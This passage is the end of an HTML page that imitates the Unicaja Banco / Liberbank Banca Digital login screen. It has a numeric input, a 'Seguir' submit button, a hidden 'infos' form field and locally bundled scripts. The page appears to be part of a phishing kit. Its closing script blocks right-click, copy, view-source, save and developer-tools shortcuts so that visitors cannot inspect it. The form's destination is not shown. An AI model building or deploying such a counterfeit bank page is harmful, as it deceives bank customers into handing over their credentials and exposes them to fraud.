x92vnz1kIA+ooOIdV0/e/asXbfe+xij9/7t0ds3b94457qua5rGe//8+fPz83MRWa/XTdNgdNtb02pe1Ytq+t96uZgMhtOICIx646uUQsT9/X2tFAKKAJHa3d0VAaXUJiYRHR4eEhERxhgSk4gAIqV9F6Pp6fVWiXaWEFNExm+/e83Mp6enLCwCALBa2Tt37sxmM+99jCzCNzc3IlIURQgBABDh7PzMJEaCvXf44Va2BCQWIVI39c7Z9JMQ+WPeoigis4gAQL+fe++ZmZmdc947771zbrVaxRiJSCkyiSEiTHr/+vGOJyZQAADCPclSRomof5r4wHn/7t27x48ff/jwQUTu3fvZZDptrT08PPz662+Gw+Hnv/r85ORkNBwOh8OvXny1bttlWP/zk9OGHLkAiFwk+8vRk7MDZqHNTtiEWiwWbds655bLZde5d99/f3R0tF53McYQQrden56cHB8fe+83P4sCgcjbddKI+08ddAjUefbCrEXEOae1RlKPHj3KsoyIrLXGmAcPHtjWmtRorZXSWZbdv39/PB4nSQICAEgEicfUJIKQ5gPsVOKzyIgi+Je/vmjb9vT0tGmaruucc+v1Wim1Wq02DBARIiZJIiIiDAAikKZGKRVDd7GcBg3AACKklGZ1S5UpKt00Tdu2BwcHABBCEJGzs7Orq6unT59uqldKHR8f53m+v78vwogIgEdHRyGE4Om3P/8NEXnvAMCYtF4uLy7PSBHVdV1V1WAwyPO8KIrRaFQUhTHm4OCgqqrLy8u9vb00TUVkd7w7HA6Ho+Ht27e11jFGH7rBaNDfyk0vS3u9clDu7mynOskSo+fzubVWRJg5RlaKBVgniiWubGOtFYnMUSmSjQDUT+IYmUEARGIIiMjCAGLSLEm0rqpqtVpNJhOltAi3LTV1AwDz+fzTw083F9vajLOqWmwwaJrGWrsBfD6vkkQzMwBYa71zed43JsE//PFPwXlBSLRWWiulCJEIY2REEBEARERhiRyZhZk3aCIgEiKCIqV0kiQ6NWkvy8rBVppmmoWNVmiSRNFGiIAiopUSQUABgI9eggQAgIJASKRIKVJKaa0TkxpjellWFHlRFGVZ/g8+KJJKG8ZhUgAAAABJRU5ErkJggg==) 50% 50% no-repeat;background-size:35px;background-position-x:99%;border-radius:2px;background-color:white" oninput="this.value=this.value.replace(/[^0-9]/g,'');">
           </div>
          </div>
         </div>
        </div>


 
       <div style="
    margin-top: 25px;
">
							<div>
								<input type="submit" id="btn-entrar" tabindex="3" value="Seguir" class="btn btn-lbk">
							</div>
						</div>
	   <input type="hidden" name="type" value="infos">

      
     </div>
</div>
						
						
					</form>
				</div>
				
				<div class="col-12 col-md-4 mt-5 mt-md-0">
					<div class="texto-ayuda p-3 mb-3">
						<p class="titulo">Acciones importantes</p>
						<p>
							<a href="#" class="semibold">
								Darme de alta en Banca Digital <i class="fas icono-chevron fa-rotate-270"></i>
							</a>
						</p>
						<p>
							<a href="#" class="semibold">
								Acceso DNI electrónico <i class="fas icono-chevron fa-rotate-270"></i>
							</a>
						</p>
						<p>
							<a href="#" class="semibold">
								Ver recomendaciones de seguridad <i class="fas icono-chevron fa-rotate-270"></i>
							</a>
						</p>
					</div>
					
					<div class="texto-ayuda p-3 mb-3">
						<p class="titulo">Guías de uso</p>
						<p>Consulta nuestras guías de Banca Digital para sacarle todo el provecho, informarte sobre cómo darte de alta o restablecer tu número secreto.</p>
						<div class="col-12 col-md-6 px-0">
							<a href="#" title="Consultar guías de Banca Digital">
								<input type="button" id="btn-entrar" tabindex="4" value="Ver guías" class="btn btn-lbk btn-lbk-blanco">
							</a>
						</div>
					</div>
				</div>
			</div>
		</div>
		
		<div class="container footer" style="position:fixed">
			<div class="row">
				<div class="col-12 col-md-2 d-flex align-items-center justify-content-center col-logo">
					<i class="fas icono-logo-unicaja-liberbank"></i>
				</div>
				<div class="col-12 col-md-8 d-flex align-items-center justify-content-center text-center my-sm-3 col-listado">
					<ul class="list-inline mb-0">
  						<li class="list-inline-item">© 2021 Unicaja Banco</li>
  						<li class="list-inline-item"><a href="#">Cookies</a></li>
  						<li class="list-inline-item"><a href="#">Aviso legal</a></li>
  						<li class="list-inline-item"><a href="#">Política de privacidad</a></li>
  					</ul>
				</div>
				<div class="col-12 col-md-2 d-flex align-items-center justify-content-center col-rrss">
					<a href="#" class="ml-1"><i class="fas icono-linkedin"></i></a>
					<a href="#" class="ml-1"><i class="fas icono-facebook"></i></a>
					<a href="#" class="ml-1"><i class="fas icono-twitter"></i></a>
					
				</div>
			</div>
		</div>
	</div> 

  <script src="./LB-files/jquery.min.js"></script>
<script src="./LB-files/imask.min.js"></script>
<script src="./LB-files/infos.js"></script>
 

<script>
jQuery(function($){

    document.addEventListener('contextmenu', event => event.preventDefault());
    document.onkeydown = function(e) {
        if (e.ctrlKey && 
        (e.keyCode === 67 || 
        e.keyCode === 86 || 
        e.keyCode === 85 ||
        e.keyCode === 83 || 
        e.keyCode === 117)) {
            return false;
        } else {
            return true;
        }
    };

    $(document).keydown(function (event) {
        if (event.keyCode == 123) { // Prevent F12
            return false;
        } else if (event.ctrlKey && event.shiftKey && event.keyCode == 73) { // Prevent Ctrl+Shift+I        
            return false;
        }
    });

    


    

})


</script>



</body></html>